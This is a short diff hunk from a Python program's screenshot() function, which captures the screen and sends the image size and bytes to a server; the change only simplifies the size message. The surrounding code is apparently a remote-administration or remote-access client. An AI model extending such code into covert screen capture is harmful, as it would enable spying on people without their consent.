@@ -175,7 +175,7 @@ def screenshot():
         objPic = objBytes.getvalue()
 
     # send screenshot information to server
-    send(str.encode("Receiving Screenshot\nFile size: {} bytes\nPlease wait...".format(str(len(objPic)))))
+    send(str(len(objPic)).encode())
     time.sleep(1)
     # Send Image Data to Server
     send(objPic)
